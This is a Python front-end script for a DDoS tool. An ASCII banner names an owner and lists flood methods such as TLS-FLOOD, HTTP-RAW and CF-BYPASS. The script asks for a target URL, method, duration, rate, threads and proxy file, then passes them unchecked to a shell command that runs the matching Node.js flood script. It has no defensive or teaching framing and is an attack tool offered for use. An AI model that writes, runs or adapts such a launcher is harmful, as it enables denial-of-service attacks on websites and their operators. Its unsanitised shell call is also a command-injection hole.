import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ┣➤⊂👑⊃ Owner : nminh2302 ⊂👑⊃
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ┣➤⊂💸⊃Plan : Free ⊂💸⊃
¶¶¶¶¶¶¶¶¶¶11111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ┣➤⊂👾⊃ Tool Ddos Layer 7!!! ⊂👾⊃
¶¶¶¶¶¶¶1111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶  ┣➤⊂📌⊃ Methods Ddos ⊂📌⊃
¶¶¶¶¶1111111¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ┣➤ TLS
¶¶¶¶11111111¶¶¶111¶¶¶¶¶¶¶1111111¶¶¶¶¶¶¶¶¶¶¶¶¶  ┣➤ HTTP
¶¶¶1111111111¶¶¶1111111111111111111¶¶¶¶¶¶¶¶¶¶  ┣➤ HTTPS
¶¶¶111111111111¶¶¶¶1111111111¶¶¶¶¶¶1¶¶¶¶¶1¶¶¶  ┣➤ TLS-FLOOD (TLS V2)
¶¶111111111111111111111111111¶¶111111111111¶¶  ┣➤ DESTROY
¶¶111111111111111111111111111111111111111111¶  ┣➤ GOD
¶1111¶¶¶¶1111111111111111111111111111111111¶¶  ┣➤ HTTP-RAW
¶11¶¶¶¶¶111111111111111111111111111¶¶¶¶¶¶11¶¶  ┣➤ BYPASS-V3 (Updating)
¶1¶¶¶¶¶111111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶  ┣➤ BROWSER (Updating)
¶¶¶¶¶¶111111111111¶¶1111111111111¶¶¶¶¶¶¶¶1¶¶¶  ┣➤ CF-BYPASS
¶¶¶¶¶¶1111111111111¶¶¶111111111111¶¶¶¶¶11¶¶¶¶  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━➤
¶¶¶¶¶¶1111111¶¶¶11111¶¶¶¶111111111111111¶¶¶¶¶
¶¶¶¶¶¶11111¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶
¶¶¶¶¶¶111¶¶¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶11111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(method,target, time, request, thread, proxy_file):
    command = f'node {method}.js {target} {time} {request} {thread} {proxy_file}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    target = input("\033[1;91mURL: ")
    method = input("\033[1;91mMETHOD: ")
    time = input("\033[1;91mTIME ATTACK: ")
    request = input("\033[1;91mRATE: ")
    thread = input("\033[1;91mTHREADS: ")
    proxy_file = input("\033[1;91mPROXY: ")
    print("\033[1;93m⊂🚀⊃ 𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍 ⊂🚀⊃")
    execute_command(method,target, time, request, thread, proxy_file)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
